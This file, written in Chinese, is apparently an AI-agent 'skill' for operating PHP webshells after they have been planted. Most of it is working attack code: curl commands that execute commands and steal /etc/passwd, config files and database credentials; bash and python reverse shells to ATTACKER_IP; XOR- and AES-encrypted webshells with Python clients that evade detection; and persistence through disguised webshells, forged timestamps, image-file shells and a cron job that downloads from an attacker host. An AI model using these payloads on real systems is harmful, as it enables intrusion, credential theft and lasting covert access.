---
name: webshell-management
description: "Webshell 部署后的 CLI 交互与深度利用。当 webshell 已经上传成功、需要通过 curl/python 执行命令、传输文件、建立加密通信、绕过 disable_functions/open_basedir、或做权限维持时使用。本 skill 与 webshell-deploy 互补——deploy 负责生成和上传 webshell，本 skill 负责上传成功后的所有操作。纯命令行操作，不依赖 GUI 工具"
metadata:
  tags: "webshell,交互,curl,加密shell,disable_functions,open_basedir,权限维持,文件操作,信息收集"
  category: "exploit"
---

# Webshell 部署后 CLI 操作

> **前置条件**：webshell 已部署到目标。本 skill 聚焦部署后的 CLI 交互与管理操作。

## Phase 1: curl 交互操作

### 1.1 命令执行

```bash
# system() 型: <?php system($_POST['c']);?>
curl -s -d "c=id" http://TARGET/shell.php
curl -s --data-urlencode "c=cat /etc/passwd" http://TARGET/shell.php

# eval() 型: <?php eval($_POST['c']);?>
curl -s -d "c=system('id');" http://TARGET/shell.php
curl -s -d "c=echo file_get_contents('/etc/passwd');" http://TARGET/shell.php

# GET 参数型: <?php system($_GET['c']);?>
curl -s "http://TARGET/shell.php?c=id"
```

### 1.2 文件操作

```bash
# 读文件
curl -s -d "c=echo file_get_contents('/etc/passwd');" http://TARGET/shell.php

# 写文件（部署第二个 webshell）
curl -s --data-urlencode "c=file_put_contents('/var/www/html/.config.php','<?php system(\$_POST[\"x\"]);?>');" http://TARGET/shell.php

# 下载文件到攻击机（base64 传输避免二进制问题）
curl -s -d "c=echo base64_encode(file_get_contents('/app/config/database.yml'));" http://TARGET/shell.php | base64 -d > database.yml

# 上传文件到目标
B64=$(base64 -w0 local_tool.elf)
curl -s --data-urlencode "c=file_put_contents('/tmp/tool',base64_decode('$B64'));chmod('/tmp/tool',0755);" http://TARGET/shell.php

# 搜索敏感文件
curl -s -d "c=system('find / -name \"*.conf\" -o -name \".env\" -o -name \"*password*\" 2>/dev/null | head -20');" http://TARGET/shell.php
```

### 1.3 信息收集

```bash
# 系统信息
curl -s -d "c=system('uname -a; id; hostname; ip addr');" http://TARGET/shell.php

# 内网探测
curl -s -d "c=system('cat /etc/hosts; arp -a; ip route');" http://TARGET/shell.php

# 数据库凭据搜索
curl -s -d "c=system('find / -name \"*.php\" -exec grep -l \"mysql_connect\|mysqli\|PDO\" {} \; 2>/dev/null | head -10');" http://TARGET/shell.php

# PHP 配置
curl -s -d "c=phpinfo();" http://TARGET/shell.php | grep -i "document_root\|server_addr\|disable_functions"
```

### 1.4 反弹交互式 Shell

webshell 不稳定且功能有限，应尽快升级到交互式 shell：

```bash
# bash 反弹
curl -s --data-urlencode "c=system('bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"');" http://TARGET/shell.php

# python 反弹
curl -s --data-urlencode "c=system('python3 -c \"import os,socket,subprocess;s=socket.socket();s.connect((\\\"ATTACKER_IP\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"bash\\\",\\\"-i\\\"])\"');" http://TARGET/shell.php

# 出站受限时——探测可出端口
for port in 80 443 53 8080 8443; do
  curl -s --data-urlencode "c=system('timeout 2 bash -c \"echo >/dev/tcp/ATTACKER_IP/$port\" 2>&1 && echo \"$port OPEN\" || echo \"$port CLOSED\"');" http://TARGET/shell.php
done
```

## Phase 2: 加密通信

明文 webshell 流量容易被 IDS/WAF 检测。部署加密 shell 后用 Python 客户端交互。

### 2.1 XOR 加密（服务端 + 客户端）

```php
<?php
// 服务端: xshell.php
$key = 'k3y_s3cr3t';
$data = file_get_contents('php://input');
$decoded = '';
for($i=0; $i<strlen($data); $i++){
    $decoded .= $data[$i] ^ $key[$i % strlen($key)];
}
ob_start(); eval($decoded); $result = ob_get_clean();
$encrypted = '';
for($i=0; $i<strlen($result); $i++){
    $encrypted .= $result[$i] ^ $key[$i % strlen($key)];
}
echo $encrypted;
?>
```

```python
#!/usr/bin/env python3
"""XOR webshell CLI 客户端"""
import requests, sys

URL = "http://TARGET/xshell.php"
KEY = b"k3y_s3cr3t"

def xor_crypt(data: bytes) -> bytes:
    return bytes([data[i] ^ KEY[i % len(KEY)] for i in range(len(data))])

def execute(cmd: str) -> str:
    payload = f"system('{cmd}');"
    r = requests.post(URL, data=xor_crypt(payload.encode()),
                      headers={"Content-Type": "application/octet-stream"})
    return xor_crypt(r.content).decode(errors='replace')

if __name__ == "__main__":
    while True:
        cmd = input("shell> ").strip()
        if cmd in ('exit','quit'): break
        print(execute(cmd))
```

### 2.2 AES 加密（服务端 + 客户端）

```php
<?php
// 服务端: ashell.php — AES-128-CBC
$key = md5('my_secret_key_1');
$iv = substr($key, 0, 16);
$data = file_get_contents('php://input');
$decrypted = openssl_decrypt($data, 'AES-128-CBC',
    hex2bin($key), OPENSSL_RAW_DATA, $iv);
ob_start(); eval($decrypted); $result = ob_get_clean();
$encrypted = openssl_encrypt($result, 'AES-128-CBC',
    hex2bin($key), OPENSSL_RAW_DATA, $iv);
echo base64_encode($encrypted);
?>
```

```python
#!/usr/bin/env python3
"""AES webshell CLI 客户端"""
import requests, hashlib, base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

URL = "http://TARGET/ashell.php"
KEY = bytes.fromhex(hashlib.md5(b'my_secret_key_1').hexdigest())
IV = KEY[:16]

def execute(cmd: str) -> str:
    payload = f"system('{cmd}');".encode()
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    encrypted = cipher.encrypt(pad(payload, 16))
    r = requests.post(URL, data=encrypted,
                      headers={"Content-Type": "application/octet-stream"})
    cipher2 = AES.new(KEY, AES.MODE_CBC, IV)
    return unpad(cipher2.decrypt(base64.b64decode(r.text)), 16).decode(errors='replace')

if __name__ == "__main__":
    while True:
        cmd = input("shell> ").strip()
        if cmd in ('exit','quit'): break
        print(execute(cmd))
```

## Phase 3: 绕过 PHP 限制

> 这里只做快速检测，确认需要绕过后参考具体绕过技术。

```bash
# 检查 disable_functions
curl -s -d "c=echo ini_get('disable_functions');" http://TARGET/shell.php

# 检查 open_basedir
curl -s -d "c=echo ini_get('open_basedir');" http://TARGET/shell.php

# 如果有限制 → 参考 php-bypass skill 的 Phase 1/Phase 2 执行绕过
```

## Phase 4: 权限维持

```bash
# 多点 webshell（不同路径、不同密码、伪装文件名）
curl -s --data-urlencode "c=file_put_contents('/var/www/html/css/style.php','<?php \$_GET[\"f\"](\$_GET[\"c\"]);?>');" http://TARGET/shell.php

# 时间戳伪装（与同目录正常文件一致）
curl -s -d "c=system('touch -r /var/www/html/index.php /var/www/html/css/style.php');" http://TARGET/shell.php

# 图片马（追加到正常图片 + .htaccess 解析）
curl -s --data-urlencode "c=file_put_contents('/var/www/html/img/.htaccess','AddType application/x-httpd-php .jpg');" http://TARGET/shell.php
curl -s --data-urlencode "c=system('echo \"<?php system(\\\$_GET[c]);?>\" >> /var/www/html/img/logo.jpg');" http://TARGET/shell.php

# cron 持久化
curl -s --data-urlencode "c=system('(crontab -l 2>/dev/null; echo \"*/5 * * * * curl http://ATTACKER/shell.php -o /var/www/html/.bak.php\") | crontab -');" http://TARGET/shell.php
```

## 决策树

```
webshell 已部署（由 webshell-deploy 完成）
├── 确认 shell 类型（system 型 / eval 型）→ Phase 1.1 测试
├── 检查环境限制
│   ├── disable_functions → Phase 3.1 LD_PRELOAD/FFI 绕过
│   ├── open_basedir → Phase 3.2 glob/chdir 绕过
│   └── WAF 检测流量 → Phase 2 部署 XOR/AES 加密 shell
├── 信息收集 → Phase 1.3（系统/网络/数据库凭据）
├── 尝试反弹 shell → Phase 1.4
│   ├── 出站开放 → bash/python 反弹
│   └── 出站受限 → 扫描可出端口 / 继续用 webshell
├── 权限维持 → Phase 4
│   ├── 多点 webshell + 时间戳伪装
│   └── Java 目标 → 内存马（→ ../webshell-deploy/references/memory-webshell.md）
└── 横向移动 → 内网探测 + 数据库凭据 + 端口转发
```
